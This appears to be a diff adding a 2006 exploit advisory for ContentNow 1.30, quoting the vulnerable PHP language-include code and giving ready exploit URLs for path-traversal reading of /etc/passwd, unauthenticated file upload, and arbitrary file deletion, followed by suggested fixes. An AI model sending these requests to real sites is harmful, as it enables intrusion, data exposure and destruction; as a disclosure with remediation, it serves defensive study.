@@ -1,0 +1,87 @@
+#####################################################################################
+#                                                                                   #
+#                              r0ut3r Presents...                                   #
+#                                                                                   #
+#                          Another r0ut3r discovery!                                #
+#                                                                                   #
+# ContentNow 1.30 Local File Include & Arbitrary File Upload/Delete Vulnerabilities #
+#                                                                                   #
+#####################################################################################
+#                                                                                   #
+# Software: ContentNow 1.30 Vulnerabilities                                         #
+#                                                                                   #
+# Vendor: http://www.contentnow.mf4k.de/                                            #
+#                                                                                   #
+# Released: 2006/11/13                                                              #
+#                                                                                   #
+# Discovered By: r0ut3r (writ3r [at] gmail.com)                                     #
+#                                                                                   #
+# Criticality: Highly critical                                                      #
+#                                                                                   #
+#####################################################################################
+
+Local file inclusion vulnerability
+------------------------------------
+
+Vuln code:
+----------
+  33  // get/set language
+  34  $setLang= (empty ($_GET['lang'])) ? $cnCore->getBackendLanguage() : $_GET['lang'];
+  35  
+  36  // define language
+  37  include_once ('./language/'.$setLang.'.language.php');
+  38  $lang= $cnLanguageArray[$setLang];
+
+Exploit:
+--------
+http://localhost/cn/edit.php?lang=../../../../etc/passwd%00
+http://localhost/cn/image.php?lang=../../../../etc/passwd%00
+http://localhost/cn/upload.php?lang=../../../../etc/passwd%00
+Probably more, never checked all files.
+
+File Upload/Command Execution Vulnerability:
+---------------------------------------------
+Note: They tell you to set 777 permissions on install for certain folders.
+
+http://localhost/cn/upload.php?path=/&cid=&type=file&single=false&folder=&lang=en
+set path to equal dir location:
+/ = root path
+
+Select file, then upload it.
+
+File Removal Vulnerability:
+----------------------------
+To delete files
+http://localhost/contentnow_130/cn/upload.php?path=/&cid=&type=file&folder=&lang=en&delfile=q.php&single=false
+set path to equal dir location:
+/ = root path
+set delfile for file you want to delete:
+q.php
+
+More Information:
+-----------------
+Email: writ3r [at] gmail.com
+
+Fix:
+-----
+How about some authentication?!
+Only allow the upload of certain files types, depends what you want it to use.
+
+As for local file includes, work out a better way to set languages, ie: make sure the language file included is required for the cms.
+
+Quick Fix:
+----------
+Setup .htaccess on cn/
+
+Example Fix:
+------------
+.htaccess:
+AuthName "ContentNow Fix!"
+AuthType Basic
+AuthUserFile /var/www/html/cn/.htpasswd
+Require valid-user
+
+This will prevent anyone from accessing this folder - this would be a solution for administrators whilst an upgrade, or patch is created.
+If you do want to access this better make a .htpasswd file to. 
+
+# milw0rm.com [2006-11-13]
